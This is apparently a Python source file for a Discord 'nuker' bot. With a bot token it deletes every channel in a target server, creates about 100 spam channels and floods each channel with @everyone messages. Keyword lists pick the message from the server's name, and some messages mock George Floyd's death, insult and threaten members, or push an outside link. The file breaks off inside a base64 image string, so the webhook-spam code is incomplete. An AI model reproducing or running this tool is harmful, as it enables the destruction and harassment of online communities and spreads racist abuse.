import requests
import threading
import json
import os
import time
import base64
from datetime import datetime, timedelta, timezone

from shi.console import *

def cls():
    os.system('cls')
def loadids():
    with open('shi/exids.txt', 'r', encoding='utf-8') as f:
        ids = f.read().splitlines()
        return ids
class Nuke:
    def __init__(self, tkn, server, serverid, wbh=':3', embeds=False, ban=False, webhook=False):
        self.tkn = tkn
        self.server = server
        self.serverid = serverid
        self.wbh = wbh
        self.embeds = embeds
        self.ban = ban
        self.webhook = webhook

    def embed(self, embeds):
        with open('embed.json', 'r', encoding='utf-8') as f:
            emb = json.load(f)
            return emb
    def deletechannel(self, chid):
        try:
            r = requests.delete(f'https://discord.com/api/v9/channels/{chid}', headers={'authorization': f'Bot {self.tkn}'})
            if r.status_code in [200, 201, 204]:
                Logging.success(f'Successfully deleted channel {chid}')
            elif r.status_code == 429:
                Logging.info(f'Rate limit while attempting to delete {chid}')
            else:
                Logging.fail(f'Failed to delete channel')
        except:
            Logging.fail('L')


    def getchannels(self, serverid):
        try:
            r = requests.get(
                f'https://discord.com/api/v9/guilds/{serverid}/channels',
                headers={'authorization': f'Bot {self.tkn}'}
            )
            if r.status_code in [200, 201, 204]:
                return r.json()
            else:
                Logging.fail(f'Failed to fetch channels: {r.status_code} {r.text}')
                return []
        except Exception as e:
            Logging.fail(f'Exception while fetching channels: {e}')
            return []

    def DChannels(self, serverid):
        chs = self.getchannels(serverid)
        threads = []

        for ch in chs:
            t = threading.Thread(target=self.deletechannel, args=(ch['id'],))
            threads.append(t)
            t.start()
            time.sleep(0.01)
        
        for t in threads:
            t.join()

    def createchannel(self, serverid, name):
        payload = {
            'name': name,
        }
        c = requests.post(f'https://discord.com/api/v9/guilds/{serverid}/channels', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
        if c.status_code in [200, 201, 204]:
            chnl = c.json()
            Logging.success(f'Successfully created channel {chnl["id"]}')
        elif c.status_code == 429:
            Logging.info('Rate limit while creating channel')
        else:
            Logging.fail('Failed to create channel')
        
    def CChannels(self, serverid):
        mc = ['minecraft', 'dream', 'smp', 'lifesteal', 'unstable universe', 'unstable', 'uu', 'bliss', 'strength smp', 'hermitcraft', 'soulbound', 'levels smp', 'parrotx2', 'flamefrags', 'wemmbu', 'mc', 'pvp', 'neth', 'hypixel', 'bedwars', 'skywars', '1.8', '1.9', '1.21', 'zombie', 'creeper', 'skeleton', 'ender', 'enderman', 'wither', 'mace', 'tommyinnit', 'dsmp', 'wifies', 'kenadian', 'escape room', 'wato', 'crystal pvp', 'cpvp', 'animation vs minecraft', 'avm', 'alan becker', 'mcyt']
        sigma = ['antifurry', 'antilgbt', 'anti lgbt', 'anti furry', 'afu', 'homophobic']
        rblx = ["dandy's world", 'gag', 'grow a garden', 'steal a brainrot', 'forsaken', 'pc2', 'pillar chase', 'doors', 'roblox', 'rblx', 'schlep', 'spawnism']
        betrayal = ['gassy', 'diddyblud', 'sigma', 'dih', 'india', 'george floyd', 'george droyd', 'george droid']
        mibu = ['mr incredible', 'mibu', 'phase', 'template', 'uncanny', 'verst']
        
        sername = self.server.lower()
        if any(word in sername for word in mc):
            name = '💎 download jenny mod today'
        elif any(word in sername for word in betrayal):
            name = 'im so sorry 😭😭💔'
        elif any(word in sername for word in mibu):
            name = 'justice for joshua'
        elif any(word in sername for word in rblx):
            name = 'roblox a diddy game'
        elif any(word in sername for word in sigma):
            name = 'india is tuff 🗿🗿🗿'
        else:
            name = 'incredible gassy saved the day'

        for _ in range(100):
            t = threading.Thread(target=self.createchannel, args=(serverid, name))
            t.start()
            time.sleep(0.01)

    def CChannels2(self, serverid, name, amount):
        for _ in range(amount):
            t = threading.Thread(target=self.createchannel, args=(serverid, name))
            t.start()
            time.sleep(0.01)
    
    def sendmessage(self, chid, msg, amount):
        payload = {'content': msg}
        for _ in range(amount):
            try:
                r = requests.post(f'https://discord.com/api/v9/channels/{chid}/messages', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
                if r.status_code in [200, 201, 204]:
                    Logging.success(f'Succesfully sent message in {chid}')
                elif r.status_code == 429:
                    Logging.info('Rate limit while trying to send a message')
                else:
                    print('Failed to send message')
            except:
                pass

    def Spam(self):
        mc = ['minecraft', 'dream', 'smp', 'lifesteal', 'unstable universe', 'unstable', 'uu', 'bliss', 'strength smp', 'hermitcraft', 'soulbound', 'levels smp', 'parrotx2', 'flamefrags', 'wemmbu', 'mc', 'pvp', 'neth', 'hypixel', 'bedwars', 'skywars', '1.8', '1.9', '1.21', 'zombie', 'creeper', 'skeleton', 'ender', 'enderman', 'wither', 'mace', 'tommyinnit', 'dsmp', 'wifies', 'kenadian', 'escape room', 'wato', 'crystal pvp', 'cpvp', 'animation vs minecraft', 'avm', 'alan becker', 'mcyt']
        sigma = ['antifurry', 'antilgbt', 'anti lgbt', 'anti furry', 'afu', 'homophobic']
        rblx = ["dandy's world", 'gag', 'grow a garden', 'steal a brainrot', 'forsaken', 'pc2', 'pillar chase', 'doors', 'roblox', 'rblx', 'schlep', 'spawnism']
        betrayal = ['gassy', 'diddyblud', 'sigma', 'dih', 'india', 'george floyd', 'george droyd', 'george droid']
        mibu = ['mr incredible', 'mibu', 'phase', 'template', 'uncanny', 'verst', 'super gaming house']

        sername = self.server.lower()
        if any(word in sername for word in mc):
            msg = "||@everyone|| DOWNLOAD JENNY MOD TODAY https://jennysmod.com/"
        elif any(word in sername for word in betrayal):
            msg = 'i feel so bad im not even gonna ping'
        elif any(word in sername for word in mibu):
            msg = "||@everyone|| JUSTICE FOR JOSHUA YOU M*BU FUCKS WILL PAY FOR WHAT YOU DID TO HIM"
        elif any(word in sername for word in rblx):
            msg = '||@everyone|| https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRRhpj1yM8IEjc05Z7yT6l4w74DOo7aQv02mQ&s'
        elif any(word in sername for word in sigma):
            msg = '@everyone india is the only tuff sigma boy country 🗿🗿🗿🍷🍷🍷🗿🍷💀💀'
        else:
            msg = '||@everyone|| incredible gassy saved the day'

        channels = self.getchannels(self.serverid)
        threads = []

        for channel in channels:
            t = threading.Thread(target=self.sendmessage, args=(channel['id'], msg, 50,))
            threads.append(t)
            t.start()
            time.sleep(0.01)
        
        for t in threads:
            t.join()
        
        return True
        
    def Spam2(self, msg, amount):
        channels = self.getchannels(self.serverid)
        threads = []

        for channel in channels:
            t = threading.Thread(target=self.sendmessage, args=(channel['id'], msg, amount,))
            threads.append(t)
            t.start()
            time.sleep(0.01)
        
        for t in threads:
            t.join()
        
                    
    def SpamWebhooks(self):
        mc = ['minecraft', 'dream', 'smp', 'lifesteal', 'unstable universe', 'unstable', 'uu', 'bliss', 'strength smp', 'hermitcraft', 'soulbound', 'levels smp', 'parrotx2', 'flamefrags', 'wemmbu', 'mc', 'pvp', 'neth', 'hypixel', 'bedwars', 'skywars', '1.8', '1.9', '1.21', 'zombie', 'creeper', 'skeleton', 'ender', 'enderman', 'wither', 'mace', 'tommyinnit', 'dsmp', 'wifies', 'kenadian', 'escape room', 'wato', 'crystal pvp', 'cpvp', 'animation vs minecraft', 'avm', 'alan becker', 'mcyt']
        sigma = ['antifurry', 'antilgbt', 'anti lgbt', 'anti furry', 'afu', 'homophobic']
        rblx = ["dandy's world", 'gag', 'grow a garden', 'steal a brainrot', 'forsaken', 'pc2', 'pillar chase', 'doors', 'roblox', 'rblx', 'schlep', 'spawnism']
        betrayal = ['gassy', 'diddyblud', 'sigma', 'dih', 'india', 'george floyd', 'george droyd', 'george droid']
        mibu = ['mr incredible', 'mibu', 'phase', 'template', 'uncanny', 'verst']

        wbh = self.wbh
        tkn = self.tkn
        sername = self.server.lower()

        if any(word in sername for word in mc):
            msg = "||@everyone|| DOWNLOAD JENNY MOD TODAY https://jennysmod.com/"
        elif any(word in sername for word in betrayal):
            msg = 'i feel so bad im not even gonna ping'
        elif any(word in sername for word in mibu):
            msg = "||@everyone|| George Floyd's last words.... I CANT BREATHE https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTA_eX7i1SayGHRUjWZ0sXLJm-JGbt_LlHZKw&s https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_6IaXU8yqoQHWUtpKhN9D77f68Ij8mt5d6w&s https://i1.sndcdn.com/avatars-zaCUjzWzmpQ5cqzn-4EqdxQ-t1080x1080.jpg https://pbs.twimg.com/media/GSLgbVVWAAA-9hv?format=jpg https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS5HJnR_06EWomHKncyZL_Q223mmmUTr3MYfw&s"
        elif any(word in sername for word in rblx):
            msg = '||@everyone|| https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRRhpj1yM8IEjc05Z7yT6l4w74DOo7aQv02mQ&s'
        elif any(word in sername for word in sigma):
            msg = '@everyone india is the only tuff sigma boy country 🗿🗿🗿🍷🍷🍷🗿🍷💀💀'
        else:
            msg = '||@everyone|| incredible gassy saved the day'

        channels = self.getchannels(self.serverid)
        threads = []
        img = 'data:image/png;base64,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